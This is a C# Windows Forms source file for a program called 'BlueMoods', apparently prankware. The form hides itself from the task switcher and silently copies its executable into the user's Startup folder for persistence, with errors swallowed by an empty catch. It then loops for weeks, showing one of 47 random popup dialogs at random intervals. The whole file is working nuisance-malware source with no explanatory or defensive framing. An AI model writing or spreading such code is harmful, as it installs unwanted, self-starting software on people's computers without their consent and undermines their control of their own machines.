using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace BlueMoods
{
    public partial class mood_form : Form
    {
        public mood_form()
        {
            InitializeComponent();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        private void mood_form_Load(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
            {
                System.Windows.Forms.Application.Exit();
            }

            else
            {
                try
                {
                    string exePath = "BlueMoods.exe";
                    string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    copyPath += "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Path.GetFileName(exePath);
                    File.Copy(exePath, copyPath);
                }
                catch
                {

                }

                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                while (stopwatch.Elapsed < TimeSpan.FromMilliseconds(2019644928000))
                {
                    Thread.Sleep(new Random().Next(1, 300000));
                    Random rnd = new Random(Guid.NewGuid().GetHashCode());
                    int choices = rnd.Next(0, 47);
                    switch (choices)
                    {
                        case 0:
                            moods.mood1.mood1 f1 = new moods.mood1.mood1();
                            f1.ShowDialog();
                            break;
                        case 1:
                            moods.mood2.mood2 f2 = new moods.mood2.mood2();
                            f2.ShowDialog();
                            break;
                        case 2:
                            moods.mood3.mood3 f3 = new moods.mood3.mood3();
                            f3.ShowDialog();
                            break;
                        case 3:
                            moods.mood4.mood4 f4 = new moods.mood4.mood4();
                            f4.ShowDialog();
                            break;
                        case 4:
                            moods.mood5.mood5 f5 = new moods.mood5.mood5();
                            f5.ShowDialog();
                            break;
                        case 5:
                            moods.mood6.mood6 f6 = new moods.mood6.mood6();
                            f6.ShowDialog();
                            break;
                        case 6:
                            moods.mood7.mood7 f7 = new moods.mood7.mood7();
                            f7.ShowDialog();
                            break;
                        case 7:
                            moods.mood8.mood8 f8 = new moods.mood8.mood8();
                            f8.ShowDialog();
                            break;
                        case 8:
                            moods.mood9.mood9 f9 = new moods.mood9.mood9();
                            f9.ShowDialog();
                            break;
                        case 9:
                            moods.mood10.mood10 f10 = new moods.mood10.mood10();
                            f10.ShowDialog();
                            break;
                        case 10:
                            moods.mood11.mood11 f11 = new moods.mood11.mood11();
                            f11.ShowDialog();
                            break;
                        case 11:
                            moods.mood12.mood12 f12 = new moods.mood12.mood12();
                            f12.ShowDialog();
                            break;
                        case 12:
                            moods.mood13.mood13 f13 = new moods.mood13.mood13();
                            f13.ShowDialog();
                            break;
                        case 13:
                            moods.mood14.mood14 f14 = new moods.mood14.mood14();
                            f14.ShowDialog();
                            break;
                        case 14:
                            moods.mood15.mood15 f15 = new moods.mood15.mood15();
                            f15.ShowDialog();
                            break;
                        case 15:
                            moods.mood16.mood16 f16 = new moods.mood16.mood16();
                            f16.ShowDialog();
                            break;
                        case 16:
                            moods.mood17.mood17 f17 = new moods.mood17.mood17();
                            f17.ShowDialog();
                            break;
                        case 17:
                            moods.mood18.mood18 f18 = new moods.mood18.mood18();
                            f18.ShowDialog();
                            break;
                        case 18:
                            moods.mood19.mood19 f19 = new moods.mood19.mood19();
                            f19.ShowDialog();
                            break;
                        case 19:
                            moods.mood20.mood20 f20 = new moods.mood20.mood20();
                            f20.ShowDialog();
                            break;
                        case 20:
                            moods.mood21.mood21 f21 = new moods.mood21.mood21();
                            f21.ShowDialog();
                            break;
                        case 21:
                            moods.mood22.mood22 f22 = new moods.mood22.mood22();
                            f22.ShowDialog();
                            break;
                        case 22:
                            moods.mood23.mood23 f23 = new moods.mood23.mood23();
                            f23.ShowDialog();
                            break;
                        case 23:
                            moods.mood24.mood24 f24 = new moods.mood24.mood24();
                            f24.ShowDialog();
                            break;
                        case 24:
                            moods.mood25.mood25 f25 = new moods.mood25.mood25();
                            f25.ShowDialog();
                            break;
                        case 25:
                            moods.mood26.mood26 f26 = new moods.mood26.mood26();
                            f26.ShowDialog();
                            break;
                        case 26:
                            moods.mood27.mood27 f27 = new moods.mood27.mood27();
                            f27.ShowDialog();
                            break;
                        case 27:
                            moods.mood28.mood28 f28 = new moods.mood28.mood28();
                            f28.ShowDialog();
                            break;
                        case 28:
                            moods.mood29.mood29 f29 = new moods.mood29.mood29();
                            f29.ShowDialog();
                            break;
                        case 29:
                            moods.mood30.mood30 f30 = new moods.mood30.mood30();
                            f30.ShowDialog();
                            break;
                        case 30:
                            moods.mood31.mood31 f31 = new moods.mood31.mood31();
                            f31.ShowDialog();
                            break;
                        case 31:
                            moods.mood32.mood32 f32 = new moods.mood32.mood32();
                            f32.ShowDialog();
                            break;
                        case 32:
                            moods.mood33.mood33 f33 = new moods.mood33.mood33();
                            f33.ShowDialog();
                            break;
                        case 33:
                            moods.mood34.mood34 f34 = new moods.mood34.mood34();
                            f34.ShowDialog();
                            break;
                        case 34:
                            moods.mood35.mood35 f35 = new moods.mood35.mood35();
                            f35.ShowDialog();
                            break;
                        case 35:
                            moods.mood36.mood36 f36 = new moods.mood36.mood36();
                            f36.ShowDialog();
                            break;
                        case 36:
                            moods.mood37.mood37 f37 = new moods.mood37.mood37();
                            f37.ShowDialog();
                            break;
                        case 37:
                            moods.mood38.mood38 f38 = new moods.mood38.mood38();
                            f38.ShowDialog();
                            break;
                        case 38:
                            moods.mood39.mood39 f39 = new moods.mood39.mood39();
                            f39.ShowDialog();
                            break;
                        case 39:
                            moods.mood40.mood40 f40 = new moods.mood40.mood40();
                            f40.ShowDialog();
                            break;
                        case 40:
                            moods.mood41.mood41 f41 = new moods.mood41.mood41();
                            f41.ShowDialog();
                            break;
                        case 41:
                            moods.mood42.mood42 f42 = new moods.mood42.mood42();
                            f42.ShowDialog();
                            break;
                        case 42:
                            moods.mood43.mood43 f43 = new moods.mood43.mood43();
                            f43.ShowDialog();
                            break;
                        case 43:
                            moods.mood44.mood44 f44 = new moods.mood44.mood44();
                            f44.ShowDialog();
                            break;
                        case 44:
                            moods.mood45.mood45 f45 = new moods.mood45.mood45();
                            f45.ShowDialog();
                            break;
                        case 45:
                            moods.mood46.mood46 f46 = new moods.mood46.mood46();
                            f46.ShowDialog();
                            break;
                        case 46:
                            moods.mood47.mood47 f47 = new moods.mood47.mood47();
                            f47.ShowDialog();
                            break;
                    }
                }
            }
        }
    }
}